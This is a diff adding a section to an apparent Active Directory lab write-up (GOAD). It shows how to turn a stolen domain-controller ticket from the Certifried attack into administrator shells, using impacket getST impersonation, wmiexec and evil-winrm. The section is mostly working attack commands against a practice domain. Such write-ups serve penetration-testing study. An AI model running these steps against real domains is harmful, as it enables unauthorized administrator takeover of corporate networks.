@@ -323,6 +323,42 @@ certipy account delete -u daenerys.targaryen@essos.local -hashes 'aad3b435b51404
 
 ![adcs_exploit_certifried.png](/assets/blog/GOAD/adcs_exploit_certifried.png)
 
+- Ok but now imagine you can't dcsync with secretdump due to a security product on the dc, or you just want to get a shell directly on the DC. Let's try to get a shell.
+- We got the TGT of the DC (exactly like in part 5 for samaccountname) so we will use impacket getST to impersonate the administrator and get a st to access the DC as administrator (see : [https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse))
+
+> remember to use the good impacket pull request to use this, see part5 for installation (thx again to shutdown for the adds to impacket)
+
+```bash
+export KRB5CCNAME=/workspace/certifried/meereen.ccache
+python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
+```
+
+- and now we can use our ticket
+
+```bash
+export KRB5CCNAME=/workspace/certifried/administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccache
+wmiexec.py -k @meereen.essos.local
+```
+
+![adcs_exploit_certifried_shell.png](/assets/blog/GOAD/adcs_exploit_certifried_shell.png)
+
+- We could also do the same thing but with winrm to be even more legit :)
+
+```bash
+export KRB5CCNAME=/workspace/certifried/meereen.ccache
+python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'HTTP/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
+```
+
+> Note the HTTP service asked for winrm usage
+
+```bash
+export KRB5CCNAME=/workspace/certifried/administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccache
+evil-winrm -i meereen.essos.local -r ESSOS.LOCAL
+```
+
+![adcs_exploit_certifried_shell_winrm.png](/assets/blog/GOAD/adcs_exploit_certifried_shell_winrm.png)
+
+- and voilà :)
 
 ## Shadow Credentials
 
